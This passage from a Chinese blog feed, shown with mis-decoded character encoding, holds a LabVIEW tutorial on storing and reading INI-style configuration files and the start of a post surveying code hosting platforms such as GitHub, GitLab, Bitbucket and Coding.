æ–‡ä»¶ä»¥<strong>æ®µ</strong>ä¸ºåŸºæœ¬å•ä½ã€ä»¥<strong>é”®</strong>ä¸ºæœ€å°å•ä½ç»„ç»‡æ•°æ®ï¼Œ<strong>æ®µ</strong>åŒ…å«äº†ç›¸åº”çš„<strong>æ®µå</strong>åŠè¯¥æ®µåŒ…å«çš„æ‰€æœ‰é”®ï¼Œæ¯ä¸ª<strong>é”®</strong>åŒ…å«äº†ç›¸åº”çš„<strong>é”®å</strong>å’Œ<strong>é”®å€¼</strong>ï¼Œä¸­é—´ç”¨ç­‰å·è¿æ¥ã€‚</p>
<pre><code class="txt">[æ®µå1]
é”®å1 = é”®å€¼1
é”®å2 = é”®å€¼2
é”®å3 = é”®å€¼3

[æ®µå2]
é”®å4 = é”®å€¼4
é”®å5 = é”®å€¼5
é”®å6 = é”®å€¼6

[æ®µå3]
é”®å7 = é”®å€¼7
é”®å8 = é”®å€¼8
</code></pre>
<p><strong>ä¸¾ä¾‹è¯´æ˜</strong>ï¼šæŸäººè¦ä¿å­˜è‡ªå·±æ¯æ—¥çš„å°±é¤æ—¶é—´ï¼Œæ­¤æ—¶å¯ç”¨ä¸€ä¸ª<strong>æ®µ</strong>æ¥å­˜å‚¨ï¼Œ<strong>æ®µå</strong>ä¸ºâ€œå°±é¤æ—¶é—´â€ï¼Œä¸‰ä¸ª<strong>é”®å</strong>ä¾æ¬¡ä¸ºæ—©é¤ã€åˆé¤å’Œæ™šé¤ï¼Œå…·ä½“çš„æ—¶é—´ä»¥å­—ç¬¦ä¸²æ ¼å¼å­˜å‚¨ï¼Œå­˜å‚¨åçš„ç»“æœå¦‚ä¸‹ï¼š</p>
<pre><code class="txt">[å°±é¤æ—¶é—´]
æ—©é¤ = 07:30
åˆé¤ = 12:00
æ™šé¤ = 05:30
</code></pre>
<h3 id="æ•°æ®ç±»å‹"><a href="#æ•°æ®ç±»å‹" class="headerlink" title="æ•°æ®ç±»å‹"></a>æ•°æ®ç±»å‹</h3><p>LabVIEW æä¾›çš„ä¸é…ç½®æ–‡ä»¶å­˜å–ç›¸å…³çš„å‡½æ•°æ”¯æŒä»¥ä¸‹6ç§æ•°æ®ç±»å‹ï¼Œå…¶ä¸­å¸ƒå°”å‹å³å¼€å…³é‡ï¼Œä»…åŒ…å« <code>TRUE</code>, <code>FALSE</code> ä¸¤ä¸ªå€¼ï¼›è·¯å¾„æŒ‡çš„æ˜¯æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹çš„è·¯å¾„ã€‚</p>
<ul>
<li>æœ‰ç¬¦å·æ•´å‹ï¼š <code>I8</code>, <code>I16</code>, <code>I32</code></li>
<li>æ— ç¬¦å·æ•´å‹ï¼š <code>U8</code>, <code>U16</code>, <code>U32</code></li>
<li>æµ®ç‚¹å‹ï¼š <code>DBL</code>, <code>SGL</code></li>
<li>å¸ƒå°”å‹ï¼š <code>BOOL</code></li>
<li>å­—ç¬¦ä¸²ï¼š <code>STRING</code></li>
<li>è·¯å¾„ï¼š <code>PATH</code></li>
</ul>
<h3 id="å˜ä½“"><a href="#å˜ä½“" class="headerlink" title="å˜ä½“"></a>å˜ä½“</h3><p>LabVIEW æä¾›äº†ä¸€ç§ç‰¹æ®Šçš„æ•°æ®ç±»å‹â€”â€”å˜ä½“ï¼Œå˜ä½“ç±»ä¼¼äº C è¯­è¨€ä¸­çš„ç©ºç±»å‹æŒ‡é’ˆ <code>void*</code>ï¼Œä¸ä»£è¡¨å…·ä½“çš„ç±»å‹ï¼Œä½†å¯ä»¥å­˜å‚¨ä»»æ„ç±»å‹çš„æ•°æ®ã€‚</p>
<p>åœ¨å­˜å‚¨é…ç½®æ–‡ä»¶æ—¶ï¼Œå¯ä»¥å…ˆå°†æ»¡è¶³ <a href="#1-3-æ•°æ®ç±»å‹">1.3</a> ä¸­ç±»å‹çš„æ•°æ®è½¬æ¢ä¸ºå˜ä½“æ•°æ®ï¼Œç„¶åä»¥å˜ä½“æ•°ç»„å½¢å¼å­˜å‚¨ï¼Œæ–¹ä¾¿ç»Ÿä¸€ç®¡ç†ï¼›åŒæ ·ï¼Œåœ¨è¯»å–é…ç½®æ–‡ä»¶æ—¶ï¼Œä¹Ÿå¯ä»¥å…ˆå°†æ•°æ®è¯»å–åˆ°å˜ä½“æ•°ç»„ä¸­ï¼Œåç»­å†è¿›ä¸€æ­¥è§£æã€‚å…·ä½“æ“ä½œæ­¥éª¤åé¢ä¼šæœ‰è¯¦è¿°ã€‚</p>
<h2 id="ä»£ç å®ç°"><a href="#ä»£ç å®ç°" class="headerlink" title="ä»£ç å®ç°"></a>ä»£ç å®ç°</h2><p>äº†è§£äº†é…ç½®æ–‡ä»¶çš„æ ¼å¼åŠæ•°æ®ç±»å‹ï¼Œä¸‹é¢ä»‹ç»å¦‚ä½•åœ¨ LabVIEW å®ç°é…ç½®æ–‡ä»¶çš„å­˜å–ã€‚</p>
<h3 id="é…ç½®å‡½æ•°"><a href="#é…ç½®å‡½æ•°" class="headerlink" title="é…ç½®å‡½æ•°"></a>é…ç½®å‡½æ•°</h3><p>LabVIEW æä¾›äº†ä»¥ä¸‹å‡½æ•°ä¾›å¼€å‘äººå‘˜ä½¿ç”¨ï¼š</p>
<p><img src="/assets/labview/rwCFG/ConfigFunc.png" alt="ConfigFunc.vi"></p>
<p>ä½†åº”ç”¨è¾ƒå¤šçš„ä¸é…ç½®æ–‡ä»¶å­˜å–ç›¸å…³çš„å‡½æ•°ä¸»è¦æœ‰ï¼š</p>
<ol>
<li>æ‰“å¼€é…ç½®æ•°æ®</li>
<li>å…³é—­é…ç½®æ•°æ®</li>
<li>è½¬æ¢è‡³å˜ä½“</li>
<li>ä»å˜ä½“è½¬æ¢è‡³æ•°æ®</li>
<li>å†™å…¥é”®</li>
<li>è¯»å–é”®</li>
</ol>
<h4 id="æ‰“å¼€é…ç½®æ•°æ®"><a href="#æ‰“å¼€é…ç½®æ•°æ®" class="headerlink" title="æ‰“å¼€é…ç½®æ•°æ®"></a>æ‰“å¼€é…ç½®æ•°æ®</h4><p><img src="/assets/labview/rwCFG/OpenConfigData.png" alt="OpenConfigData.vi"></p>
<p><code>Open Config Data.vi</code> ç”¨äºæ‰“å¼€é…ç½®æ–‡ä»¶ï¼Œå¦‚æœæ–‡ä»¶ä¸å­˜åœ¨åˆ™å…ˆåˆ›å»ºå†æ‰“å¼€ï¼Œè¿”å›å¼•ç”¨å¥æŸ„ç”¨äºåç»­çš„æ•°æ®å­˜å–ã€‚</p>
<h4 id="å…³é—­é…ç½®æ•°æ®"><a href="#å…³é—­é…ç½®æ•°æ®" class="headerlink" title="å…³é—­é…ç½®æ•°æ®"></a>å…³é—­é…ç½®æ•°æ®</h4><p><img src="/assets/labview/rwCFG/CloseConfigData.png" alt="CloseConfigData.vi"></p>
<p>è¯¥å‡½æ•°ä¸ <code>Open Config Data.vi</code> æˆå¯¹å‡ºç°ï¼Œåœ¨å¯¹é…ç½®æ–‡ä»¶è¿›è¡Œå­˜å–æ“ä½œåï¼Œéœ€è¦ä½¿ç”¨ <code>Close Config Data.vi</code> å…³é—­å¯¹é…ç½®æ–‡ä»¶çš„å¼•ç”¨ï¼Œé‡Šæ”¾é…ç½®æ–‡ä»¶å ç”¨çš„å†…å­˜ã€‚</p>
<h4 id="è½¬æ¢è‡³å˜ä½“"><a href="#è½¬æ¢è‡³å˜ä½“" class="headerlink" title="è½¬æ¢è‡³å˜ä½“"></a>è½¬æ¢è‡³å˜ä½“</h4><p><img src="/assets/labview/rwCFG/ToVariant.png" alt="ToVariant.vi"></p>
<p><code>To Variant.vi</code> å¯å°†ä»»æ„æ•°æ®ç±»å‹çš„æ•°æ®è½¬æ¢ä¸ºå˜ä½“æ•°æ®ã€‚</p>
<h4 id="ä»å˜ä½“è½¬æ¢è‡³æ•°æ®"><a href="#ä»å˜ä½“è½¬æ¢è‡³æ•°æ®" class="headerlink" title="ä»å˜ä½“è½¬æ¢è‡³æ•°æ®"></a>ä»å˜ä½“è½¬æ¢è‡³æ•°æ®</h4><p><img src="/assets/labview/rwCFG/VariantToData.png" alt="VariantToData.vi"></p>
<p><code>Variant To Data.vi</code> æ˜¯ <code>To Variant.vi</code> çš„é€†è¿‡ç¨‹ï¼Œé€šè¿‡æŒ‡å®šæ•°æ®ç±»å‹ï¼Œå¯ä»¥å°†å˜ä½“æ•°æ®è¿˜åŸä¸ºè½¬æ¢ä¸ºå˜ä½“å‰çš„æ•°æ®ã€‚</p>
<h4 id="å†™å…¥é”®"><a href="#å†™å…¥é”®" class="headerlink" title="å†™å…¥é”®"></a>å†™å…¥é”®</h4><p><img src="/assets/labview/rwCFG/WriteKey.png" alt="WriteKey.vi"></p>
<p>é™¤é”™è¯¯ç°‡å¤–ï¼Œ<code>Write Key.vi</code> åŒ…å«4ä¸ªè¾“å…¥ï¼š<strong>æ®µ</strong>å¯¹åº”å­—ç¬¦ä¸²ç±»å‹çš„<strong>æ®µå</strong>ï¼Œ<strong>é”®</strong>å¯¹åº”å­—ç¬¦ä¸²ç±»å‹çš„<strong>é”®å</strong>ï¼Œ<strong>å€¼</strong>å¯¹åº”ä»»æ„æ•°æ®ç±»å‹çš„<strong>é”®å€¼</strong>ï¼Œ<strong>å¼•ç”¨å¥æŸ„</strong>ç”¨äºè¿æ¥é…ç½®æ–‡ä»¶çš„å¼•ç”¨å¥æŸ„ã€‚è¯´æ˜ï¼šLabVIEW ä¸­çš„å¼•ç”¨å¥æŸ„ç­‰åŒäº <code>C/C++</code> è¯­è¨€ä¸­çš„å¼•ç”¨ï¼Œå³å˜é‡çš„åˆ«åã€‚</p>
<p>è¯¥å‡½æ•°æ ¹æ®è¾“å…¥å‚æ•°å°†é”®åå’Œé”®å€¼ä¿å­˜åˆ°é…ç½®æ–‡ä»¶çš„æŒ‡å®šæ®µä¸­ï¼Œå¦‚æœæ˜¯é¦–æ¬¡åˆ›å»ºæŒ‡å®šçš„æ®µï¼Œåˆ™è‡ªåŠ¨åœ¨é…ç½®æ–‡ä»¶ä¸­æ·»åŠ æ–°çš„æ®µåŠé”®ï¼›å¦‚æœæ®µå·²å­˜åœ¨é”®ä¸å­˜åœ¨ï¼Œåˆ™ä»…æ·»åŠ é”®ï¼›å¦‚æœæ®µä¸é”®å‡å·²å­˜åœ¨ï¼Œåˆ™ä»…ç”¨æ–°é”®å€¼æ›¿æ¢æ—§é”®å€¼ã€‚</p>
<h4 id="è¯»å–é”®"><a href="#è¯»å–é”®" class="headerlink" title="è¯»å–é”®"></a>è¯»å–é”®</h4><p><img src="/assets/labview/rwCFG/ReadKey.png" alt="ReadKey.vi"></p>
<p>ä½¿ç”¨ <code>Read Key.vi</code> ï¼Œé€šè¿‡<strong>æ®µå</strong>å’Œ<strong>é”®å</strong>ï¼Œæˆ‘ä»¬å¯ä»¥ä»æŒ‡å®šæ–‡ä»¶ä¸­è·å–æ‰€éœ€çš„æ•°æ®ã€‚</p>
<p>éœ€è¦è¯´æ˜çš„æ˜¯ï¼Œ <code>Read Key.vi</code> æ˜¯å¤šæ€VIï¼Œå…¶é”®å€¼çš„æ•°æ®ç±»å‹æ˜¯å¤šæ€å¯é€‰çš„ï¼Œå¯é€‰é¡¹å‚è§ <a href="#1-3-æ•°æ®ç±»å‹">1.3</a>ã€‚</p>
<h3 id="å­˜å‚¨é…ç½®æ–‡ä»¶"><a href="#å­˜å‚¨é…ç½®æ–‡ä»¶" class="headerlink" title="å­˜å‚¨é…ç½®æ–‡ä»¶"></a>å­˜å‚¨é…ç½®æ–‡ä»¶</h3><p>è¯´äº†ä¸€å¤§å †ï¼Œé‚£åˆ°åº•å¦‚ä½•å­˜å‚¨å‘¢ï¼Œè¿˜æ˜¯ç”¨ç¨‹åºæ¡†å›¾æ¥è¯´è¯å§ï¼Œä¸€ç›®äº†ç„¶ã€‚</p>
<ul>
<li><strong><code>RWConfigData.vi</code> å†™æ“ä½œ</strong></li>
</ul>
<p><img src="/assets/labview/rwCFG/WriteToFile.png" alt="RWConfigData.vi Write Data"></p>
<p>è¯¥ VI åä¸º <strong><code>RWConfigData.vi</code></strong> ï¼Œä¸æ¶‰åŠé…ç½®æ–‡ä»¶çš„æ‰“å¼€ä¸å…³é—­ï¼Œæ˜¯é…ç½®æ–‡ä»¶æ‰“å¼€ä»¥åçš„æ“ä½œï¼Œæ–‡ä»¶çš„å¼•ç”¨å¥æŸ„ä¸º <code>refnum in</code> å’Œ <code>refnum out</code> ã€‚å‡½æ•°æ¥å£å¦‚ä¸‹ï¼š</p>
<p><img src="/assets/labview/rwCFG/WriteToFileInterface.png" alt="RWConfigData.vi Interface"></p>
<p>æ’æ’­ä¸€å¥ï¼Œåœ¨ LabVIEW ä¸­ï¼Œè®¸å¤šå‡½æ•°çš„è¾“å…¥è¾“å‡ºéƒ½æ˜¯æˆå¯¹å‡ºç°çš„ï¼Œå°¤å…¶æ˜¯å¼•ç”¨å¥æŸ„å’Œé”™è¯¯ç°‡ï¼Œè¿™æœ‰ç‚¹ç±»ä¼¼äº java è¯­è¨€ä¸­ç”¨äºè¿”å›å½“å‰å¯¹è±¡çš„ this æŒ‡é’ˆï¼Œä¾¿äºå®ç°å‡½æ•°çš„é“¾å¼è°ƒç”¨ï¼Œä»¤ä»£ç æ›´ç®€æ´ï¼Œå¹¶å¢å¼ºä»£ç çš„å¯è¯»æ€§ã€‚</p>
<p>è¨€å½’æ­£ä¼ ï¼Œä»¥ä¸Šç¨‹åºæ¡†å›¾ä¸­ï¼Œ<code>CMD</code> æ˜¯ä¸ªæšä¸¾å˜é‡ï¼ŒåŒ…å« <code>Write</code> å’Œ <code>Read</code> ä¸¤ä¸ªå€¼ï¼Œåˆ†åˆ«å¯¹åº”æ–‡ä»¶çš„å†™æ“ä½œå’Œè¯»æ“ä½œï¼›è¾“å…¥å‚æ•° <code>DataParam</code> æ˜¯ä¸€ä¸ªç°‡ï¼ŒåŒ…å«äº†éœ€è¦å­˜å‚¨çš„æ•°æ®ï¼Œç°‡åŒ…å«çš„æ•°æ®å…ƒç´ å¦‚ä¸‹ï¼š</p>
<pre><code class="txt">SectionName : æ®µåï¼ˆå•ä¸ªå­—ç¬¦ä¸²ï¼‰
KeyName : é”®åï¼ˆä¸€ç»´çš„å­—ç¬¦ä¸²æ•°ç»„ï¼‰
DataType : æ•°æ®ç±»å‹ï¼ˆä¸€ç»´çš„æšä¸¾æ•°ç»„ï¼Œæšä¸¾åŒ…å«äº†æ–‡ä¸­æåŠçš„ 6 ç§æ•°æ®ç±»å‹ï¼‰
VariantData : é”®å€¼æ•°æ®ï¼ˆä¸€ç»´çš„å˜ä½“æ•°ç»„ï¼‰
</code></pre>
<p>ç”¨å˜ä½“æ•°ç»„çš„æ–¹å¼å¯ä»¥æ‰¹é‡å¤„ç†å¾…å­˜å‚æ•°ï¼Œé«˜æ•ˆä¾¿æ·ï¼Œå”¯ä¸€ç¹ççš„ä¸€ç‚¹å°±æ˜¯éœ€è¦å…ˆå°†å¾…å­˜å‚æ•°å‡éƒ½è½¬æ¢ä¸ºå˜ä½“æ•°æ®ã€‚ä¸Šé¢çš„ç¨‹åºæ¡†å›¾ä»…æ˜¾ç¤ºäº†å¸ƒå°”å‹æ•°æ®çš„å­˜å‚¨æ–¹å¼ï¼Œå…¶å®ƒç±»å‹çš„æ•°æ®çš„å­˜å‚¨æ–¹å¼ä¸ä¹‹ç›¸ä¼¼ï¼Œæ¯ç§ç±»å‹çš„æ•°æ®å¯¹åº”ä¸€ä¸ªæ¡ä»¶åˆ†æ”¯ã€‚</p>
<p><img src="/assets/labview/rwCFG/WriteToFile1.png" alt="RWConfigData.vi Write Data"></p>
<ul>
<li><strong><code>RWSingleElement.vi</code> å†™æ“ä½œ</strong></li>
</ul>
<p>å¯¹äºå•ä¸ªå‚æ•°çš„å­˜å‚¨ï¼ŒåŒæ ·å¯ä»¥ä½¿ç”¨è¯¥å‡½æ•°ï¼Œç»“åˆé…ç½®æ–‡ä»¶çš„æ‰“å¼€ã€å…³é—­å‡½æ•°ï¼Œå…·ä½“ä»£ç å®ç°å¦‚ä¸‹ï¼š</p>
<p><img src="/assets/labview/rwCFG/WriteSingleData.png" alt="RWSingleElement.vi Write Data"></p>
<p>ä»£ç ä¸­çš„å…ƒç´ ä¿¡æ¯å°±æ˜¯æŸä¸ªå¾…å­˜å‚æ•°çš„ç›¸å…³ä¿¡æ¯ï¼Œç”¨åˆ°çš„å­˜å‚¨å­ VI å°±æ˜¯ä¸Šé¢æè¿°çš„ <strong><code>RWConfigData.vi</code></strong> ã€‚è¯¥ç¨‹åºæœ¬èº« <strong><code>RWSingleElement.vi</code></strong> çš„å‡½æ•°æ¥å£å¦‚ä¸‹ï¼š</p>
<p><img src="/assets/labview/rwCFG/WriteSingleDataInterface.png" alt="RWSingleElement.vi Interface"></p>
<h3 id="è¯»å–é…ç½®æ–‡ä»¶"><a href="#è¯»å–é…ç½®æ–‡ä»¶" class="headerlink" title="è¯»å–é…ç½®æ–‡ä»¶"></a>è¯»å–é…ç½®æ–‡ä»¶</h3><p>ä¸å­˜å‚¨ç›¸å¯¹åº”çš„æ“ä½œæ˜¯è¯»å–ï¼Œä¸Šé¢æåŠçš„ä¸¤ä¸ªVI <strong><code>RWConfigData.vi</code></strong> å’Œ <strong><code>RWSingleElement.vi</code></strong> å¯¹åº”çš„ <code>Read</code> åˆ†æ”¯åˆ†åˆ«å¦‚ä¸‹ï¼š</p>
<ul>
<li><strong><code>RWConfigData.vi</code> è¯»æ“ä½œ</strong></li>
</ul>
<p><img src="/assets/labview/rwCFG/ReadFromFile.png" alt="RWConfigData.vi Read Data"></p>
<ul>
<li><strong><code>RWSingleElement.vi</code> è¯»æ“ä½œ</strong></li>
</ul>
<p><img src="/assets/labview/rwCFG/ReadSingleData.png" alt="RWSingleElement.vi Read Data"></p>
<h2 id="é…ç½®æ–‡ä»¶å­˜å‚¨ä¾‹ç¨‹"><a href="#é…ç½®æ–‡ä»¶å­˜å‚¨ä¾‹ç¨‹" class="headerlink" title="é…ç½®æ–‡ä»¶å­˜å‚¨ä¾‹ç¨‹"></a>é…ç½®æ–‡ä»¶å­˜å‚¨ä¾‹ç¨‹</h2><p>ä¸‹é¢ç»™å‡ºä¸€ä¸ªéå¸¸ç®€å•çš„é…ç½®æ–‡ä»¶å­˜å–ç¤ºä¾‹ç¨‹åºã€‚</p>
<ul>
<li><strong>ç¤ºä¾‹ç¨‹åºå‰é¢æ¿</strong></li>
</ul>
<p><img src="/assets/labview/rwCFG/DemoFrontPanel.png" alt="RWConfigFileDemo.vi FrontPanel"></p>
<ul>
<li><strong>ç¤ºä¾‹ç¨‹åºæ¡†å›¾ å†™æ“ä½œ</strong></li>
</ul>
<p><img src="/assets/labview/rwCFG/DemoWriteData.png" alt="RWConfigFileDemo.vi Block diagram: Write"></p>
<ul>
<li><strong>ç¤ºä¾‹ç¨‹åºæ¡†å›¾ è¯»æ“ä½œ</strong></li>
</ul>
<p><img src="/assets/labview/rwCFG/DemoReadData.png" alt="RWConfigFileDemo.vi Block diagram: Read"></p>
<ul>
<li><strong>ç¤ºä¾‹ç¨‹åº æ‰§è¡Œç»“æœ</strong></li>
</ul>
<p><img src="/assets/labview/rwCFG/DemoResultFile.png" alt="RWConfigFileDemo.vi Result File"></p>
<h2 id="ä¸‹è½½é“¾æ¥"><a href="#ä¸‹è½½é“¾æ¥" class="headerlink" title="ä¸‹è½½é“¾æ¥"></a>ä¸‹è½½é“¾æ¥</h2><p><a href="http://pan.baidu.com/s/1eRRVqRg" target="_blank" rel="noopener">http://pan.baidu.com/s/1eRRVqRg</a></p>
<p>PSï¼šæœ€åå‹æƒ…è¯´æ˜ä¸€ä¸‹ï¼Œå…¶å®æ–‡ä»¶æ‰©å±•åä¸ä¸€å®šè¦è®¾ä¸º <code>.cfg</code> ï¼Œå…¶å®ƒç±»ä¼¼ <code>.ini</code> , <code>.sys</code> ç­‰æ‰©å±•åä¹Ÿéƒ½æ˜¯å¯ä»¥çš„ã€‚</p>
]]></content>
      
        <categories>
            
            <category> LabVIEW </category>
            
        </categories>
        
        
        <tags>
            
            <tag> labview </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[å¸¸ç”¨çš„ä»£ç æ‰˜ç®¡å¹³å°]]></title>
      <url>https://www.litreily.top/2017/03/23/code-Platform/</url>
      <content type="html"><![CDATA[<p>ä½œä¸ºä¸€åç¨‹åºå‘˜ï¼Œæœ€ä¸ç¼ºçš„å°±æ˜¯ä»£ç ï¼Œé‚£è‡ªç„¶å¾—é€‰æ‹©ä¸ªå¥½ç”¨çš„ä»£ç æ‰˜ç®¡å¹³å°ï¼Œæœ¬æ–‡å°†å¯¹å¸¸ç”¨çš„å‡ ä¸ªå¹³å°è¿›è¡Œç®€è¦æè¿°ã€‚</p>
<h2 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h2><p><img src="/assets/introduction/codePlatform/github.png" alt="github"></p>
<p>æ¯‹åº¸ç½®ç–‘ï¼Œ<a href="https://github.com/" target="_blank" rel="noopener">Github</a> æ˜¯å…¨çƒåº”ç”¨æœ€å¹¿çš„ä»£ç æ‰˜ç®¡å¹³å°ï¼Œå…¼ç¤¾äº¤å¹³å°ï¼Œæœ¬åšå®¢ä¾¿æ‰¿è½½äº Github çš„ pages æœåŠ¡ã€‚ä½†æ˜¯ä½¿ç”¨ Github ä¿å­˜ç§æœ‰é¡¹ç›®æ˜¯è¦æ”¶è´¹çš„ï¼Œæ‰€ä»¥æˆ‘ä¸»è¦ç”¨å…¶ç®¡ç†å¯å…¬å¸ƒäºä¼—çš„å¼€æºé¡¹ç›®ã€‚</p>
<h2 id="GitLab"><a href="#GitLab" class="headerlink" title="GitLab"></a>GitLab</h2><p><img src="/assets/introduction/codePlatform/gitlab.png" alt="gitLab"></p>
<p><a href="https://gitlab.com/" target="_blank" rel="noopener">gitLab</a> ç›¸æ¯”äº <code>Github</code> å…·æœ‰æ›´å¤šçš„ç‰¹æ€§ï¼Œå®˜æ–¹ç‚¹æ˜çš„ç‰¹æ€§æœ‰ï¼š</p>
<ul>
<li>Unlimited repositories</li>
<li>Unlimited private collaborators</li>
<li>10GB disk space per project (including Git LFS)</li>
<li>Unlimited total disk space</li>
<li>Completely free, no credit card required</li>
<li>Unlimited CI Runners to do parallel testing</li>
<li>Alternate SSH port for git+ssh (443)</li>
</ul>
<h2 id="Visual-Studio-Team-Services-VSTS"><a href="#Visual-Studio-Team-Services-VSTS" class="headerlink" title="Visual Studio Team Services(VSTS)"></a>Visual Studio Team Services(VSTS)</h2><p><img src="/assets/introduction/codePlatform/VS-team-services.png" alt="VS Team Services"></p>
<p>å¾®è½¯æä¾›çš„ <a href="https://www.visualstudio.com/team-services/" target="_blank" rel="noopener">Team Services</a> ä¹Ÿæ˜¯ç›¸å½“å‡ºè‰²çš„å›¢é˜Ÿåä½œæœåŠ¡å¹³å°ï¼Œä¸ºå¼€å‘äººå‘˜æˆ–å›¢é˜ŸååŠ©å¼€å‘æä¾›çº¿ä¸ŠæœåŠ¡ï¼Œæä¾›äº†é¡¹ç›®ç®¡ç†ã€ç‰ˆæœ¬æ§åˆ¶ã€è‡ªåŠ¨å»ºç½®ã€è‡ªåŠ¨æµ‹è¯•ã€éƒ¨ç½²å‘è¡Œç®¡ç†ç­‰åŠŸèƒ½ï¼Œå¹¶ä¸”æ”¯æŒå„ç§è¯­è¨€ã€å¼€å‘å¹³å°æˆ–æ˜¯ IDE å·¥å…·ç­‰ï¼Œäº”äººä»¥ä¸‹å›¢é˜Ÿå¯å…è´¹ä½¿ç”¨ã€‚</p>
<p>å¾®è½¯çš„äº²å„¿å­ <a href="https://www.visualstudio.com/" target="_blank" rel="noopener">Visual Studio</a> ç°å·²æ›´æ–°è‡³ 2017 ç‰ˆï¼Œä»æ—©æœŸç‰ˆæœ¬ä¾¿å·²é›†æˆäº† <code>VSTS</code> å·¥å…·ï¼Œåœ¨ <code>VS</code> ä¸­ï¼Œé…åˆ <code>git</code> æˆ– Team Foundation Version Control (<code>TFVC</code>) ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œä»å›¢é˜Ÿèµ„æºç®¡ç†å™¨å¯ä»¥æ–¹ä¾¿ä¸Šä¼ ä»£ç è‡³ <code>VSTS</code> æœåŠ¡å™¨ï¼Œè¿˜å¯ä»¥ä» <code>Github</code> ç­‰å…¶å®ƒå¹³å°è¿›è¡Œé¡¹ç›®å…‹éš†ã€‚æˆ‘é€šå¸¸åœ¨ä½¿ç”¨ <code>VS</code> è¿›è¡Œè½¯ä»¶å¼€å‘æ—¶å¯ç”¨å®ƒæ¥ç®¡ç†ä»£ç ã€‚</p>
<p><img src="/assets/introduction/codePlatform/VSTS.png" alt="VSTS"></p>
<h2 id="Bitbucket"><a href="#Bitbucket" class="headerlink" title="Bitbucket"></a>Bitbucket</h2><p><img src="/assets/introduction/codePlatform/bitbucket.png" alt="Bitbucket"></p>
<p><a href="https://bitbucket.org/" target="_blank" rel="noopener">Bitbucket</a> æ˜¯ä¸€ä¸ªæºä»£ç æ‰˜ç®¡ç½‘ç«™ï¼Œé‡‡ç”¨ Mercurial å’Œ git ä½œä¸ºç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œå¯¹äºå°ç­‰äº5äººçš„å°å›¢é˜Ÿæä¾›å…è´¹æ‰˜ç®¡æœåŠ¡ï¼Œç®—æ˜¯éå¸¸ä¸é”™çš„ <code>Github</code> æ›¿ä»£å“ã€‚</p>
<h2 id="Coding"><a href="#Coding" class="headerlink" title="Coding"></a>Coding</h2><p><img src="/assets/introduction/codePlatform/coding.png" alt="coding"></p>
<p><a href="https://coding.net/" target="_blank" rel="noopener">Coding</a> å®˜æ–¹ä»‹ç»ï¼š</p>
<blockquote>
<p>CODING æ˜¯å›½å†…é¦–ä¸ªä¸€ç«™å¼äº‘ç«¯è½¯ä»¶æœåŠ¡å¹³å°ï¼Œäº 2014 å¹´ 2 æœˆåœ¨æ·±åœ³æˆç«‹ï¼Œå¹¶äºåŒ—äº¬ã€ä¸Šæµ·ã€æˆéƒ½ã€è¥¿é›…å›¾è®¾ç«‹åˆ†éƒ¨ã€‚åœ¨äº‘è®¡ç®—æ—¶ä»£ï¼ŒCODING è‡´åŠ›äºé€šè¿‡æŠ€æœ¯åˆ›æ–°æ¨åŠ¨è½¯ä»¶å¼€å‘ä¸äº¤ä»˜æ¨¡å¼çš„è½¬å˜ï¼Œè®©å¼€å‘æ›´ç®€å•ã€‚</p>
</blockquote>
<p>coding æ˜¯å›½å†…å°‘æœ‰çš„åšå¾—éå¸¸æ£’çš„ä»£ç æ‰˜ç®¡å¹³å°ä¹‹ä¸€ï¼Œäº 2016 å¹´ 3 æœˆ 2 æ—¥æ”¶è´­äº† 2011 å¹´æˆç«‹çš„ <a href="https://coding.net/gitcafe.html" target="_blank" rel="noopener">GitCafe</a>ï¼Œèƒ½å¤Ÿå…è´¹å­˜å‚¨ç§æœ‰é¡¹ç›®å’Œå¼€æºé¡¹ç›®ï¼ŒåŒ…å«æœ‰è¶£çš„ç¤¾äº¤å¹³å° â€œå†’æ³¡â€ï¼Œå¤§å‹çš„ä¼—åŒ…å¹³å° â€œç å¸‚â€ï¼ŒåŒæ ·æ”¯æŒ pages æœåŠ¡ï¼Œæˆ‘ä¸»è¦ç”¨å…¶ç®¡ç†ç§æœ‰é¡¹ç›®ã€‚</p>
<h2 id="åä¸º-DevCloud"><a href="#åä¸º-DevCloud" class="headerlink" title="åä¸º DevCloud"></a>åä¸º DevCloud</h2><p><img src="/assets/introduction/codePlatform/devCloud.png" alt="DevCloud"></p>
<p><code>2017.3.22</code>å‚åŠ äº†åä¸ºåœ¨é’å²›é¦™æ ¼é‡Œæ‹‰é…’åº—ä¸¾åŠçš„è½¯ä»¶å¼€å‘äº‘å¤§ä¼šï¼Œåˆäº†è§£äº†ä¸€æ¬¾ä¼ä¸šçº§çš„é›†åä¸ºç ”å‘å®è·µã€å‰æ²¿ç ”å‘ç†å¿µã€å…ˆè¿›ç ”å‘å·¥å…·ä¸ºä¸€ä½“çš„ç ”å‘äº‘å¹³å° <a href="http://www.hwclouds.com/devcloud/" target="_blank" rel="noopener">DevCloud</a> ï¼Œé¢å‘å¼€å‘è€…æä¾›ç ”å‘å·¥å…·æœåŠ¡ï¼Œè®©è½¯ä»¶å¼€å‘ç®€å•é«˜æ•ˆï¼Œå¯¹å›½å†…å¼€å‘è€…è€Œè¨€ç»å¯¹æ˜¯ä¸€å¤§ç¦éŸ³äº†ã€‚åŒæ ·ï¼Œè¯¥å¹³å°åŠŸèƒ½å¼ºå¤§ï¼Œè‡ªç„¶ä¹Ÿå°‘ä¸äº†åŸºç¡€çš„ä»£ç æ‰˜ç®¡åŠŸèƒ½ã€‚</p>
<p><img src="/assets/introduction/codePlatform/devCloudFuncs.png" alt="DevCloudFuntions"></p>
<h2 id="ç äº‘"><a href="#ç äº‘" class="headerlink" title="ç äº‘"></a>ç äº‘</h2><p><img src="/assets/introduction/codePlatform/codeCloud.png" alt="codeCloud"></p>
<p><a href="http://git.oschina.net/" target="_blank" rel="noopener">ç äº‘</a> ä¾æ‰˜äºå›½å†…çŸ¥åç½‘ç«™ <a href="https://www.oschina.net/" target="_blank" rel="noopener">å¼€æºä¸­å›½</a>ï¼Œç•Œé¢ä¸ <code>Github</code> éå¸¸ç›¸åƒï¼Œå¯å…è´¹æ‰˜ç®¡ç§æœ‰ã€å¼€æºé¡¹ç›®ã€‚</p>
<h2 id="CSDN"><a href="#CSDN" class="headerlink" title="CSDN"></a>CSDN</h2><p><img src="/assets/introduction/codePlatform/csdnCode.png" alt="csdnCode"></p>
